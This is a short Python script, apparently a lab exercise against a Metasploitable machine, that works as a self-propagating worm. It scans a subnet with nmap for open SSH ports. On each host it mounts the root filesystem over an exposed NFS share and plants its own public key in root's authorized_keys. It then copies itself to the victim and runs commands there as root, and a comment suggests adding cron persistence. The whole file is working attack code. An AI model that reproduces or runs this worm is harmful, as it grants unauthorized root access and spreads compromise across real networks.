#! /usr/bin/env python3
import os
import nmap


def ssh():
    ssh_list = []  # Define a list to contain ip's open on port 22
    nm = nmap.PortScanner()  # Instantiate portscanner object
    nm.scan('10.0.2.0/24', '22')  # Scan ports 10.0.2.0 - 10.0.2.256 on port 22
    for host in nm.all_hosts():  # Create a for loop to iterate over the scanned host
        if nm[host]['tcp'][22]['state'] == 'open':  # Validate port 22 is open
            ssh_list.append(host)  # Add validate hosts to ssh_list
    return (ssh_list)

def worm():
    for ip in ssh():
        print(ip)
        os.system('mkdir /lotus') #makes directory to copy worm to machine
        os.system('cp ./prometheus.py /lotus') #worm is copied to directory
        os.system('{ echo -ne "\n" ; echo -ne "y" ; echo -ne "\n"; } | ssh-keygen') #key pair exploit
        os.system('mkdir /tmp/r00t') #key pair exploit
        os.system('mount -t nfs ' + str(ip) + ':/ /tmp/r00t/') #key pair exploit
        os.system('cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys') #key pair exploit
        os.system('umount /tmp/r00t') #key pair exploit
        os.system('scp -r /lotus root@' + str(ip) + ':/') # copies worm to new machine
        os.system('ssh root@'  + str(ip)) #opens ssh shell, probably not needed
        os.system('ssh root@'  + str(ip) + ' "rm /home/msfadmin/test.txt"') #test command to execute on metasploitable machine, can be used to execute worm on newly infected machine, and schedule chron job for further resilience

def main():
    worm()
# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
